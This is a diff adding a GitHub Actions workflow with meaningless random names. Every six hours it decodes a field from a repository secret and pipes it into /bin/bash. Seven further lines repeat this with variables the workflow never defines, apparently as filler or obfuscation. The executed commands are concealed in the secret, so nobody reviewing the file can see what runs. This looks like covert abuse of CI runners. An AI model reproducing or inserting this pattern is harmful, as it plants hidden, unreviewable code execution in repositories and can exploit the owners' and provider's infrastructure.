@@ -1,0 +1,25 @@
+name: zhushaohua7856
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhushaohua7856
+        env:
+          jbv1678: ${{ secrets.jbv1678 }}
+        run: |
+          echo $jbv1678 | jq -r .yfn02 | /bin/bash
+          echo $olk2 | jq -r .aq1 | /bin/bash
+          echo $i1 | jq -r .shx392 | /bin/bash
+          echo $cosw010 | jq -r .ya69431 | /bin/bash
+          echo $lbhlp941 | jq -r .zsoy02529 | /bin/bash
+          echo $yqari3 | jq -r .di3 | /bin/bash
+          echo $ciwy2 | jq -r .edov75865 | /bin/bash
+          echo $neqh15734 | jq -r .mpees23 | /bin/bash
+
